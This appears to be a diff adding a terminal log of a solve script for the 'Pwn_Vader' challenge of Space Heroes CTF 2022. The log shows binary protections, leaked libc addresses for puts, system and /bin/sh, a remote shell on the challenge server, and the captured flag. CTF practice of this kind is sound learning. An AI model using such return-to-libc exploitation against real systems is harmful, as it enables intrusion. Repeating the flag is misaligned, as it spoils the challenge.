@@ -1,0 +1,52 @@
+mito@ubuntu:~/CTF/Space_Heroes_CTF_2022/Pwn_Vader$ python solve.py r
+[*] '/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Vader/vader'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to 0.cloud.chals.io on port 20712: Done
+[*] '/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Vader/libc6_2.33-1_amd64.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+puts_addr   = 0x7faf8256bde0
+libc_base   = 0x7faf824f6000
+system_addr = 0x7faf8253f850
+binsh_addr  = 0x7faf8267e962
+[*] Switching to interactive mode
+$ id
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+$ ls
+-
+banner_fail
+bin
+boot
+dev
+etc
+flag.txt
+home
+lib
+lib32
+lib64
+libx32
+media
+mnt
+opt
+proc
+root
+run
+sbin
+service.conf
+sith.txt
+srv
+sys
+tmp
+usr
+vader
+var
+wrapper
+$ cat sith.txt
+shctf{W1th0ut-str1f3-ur-v1ctory-has-no-m3an1ng}
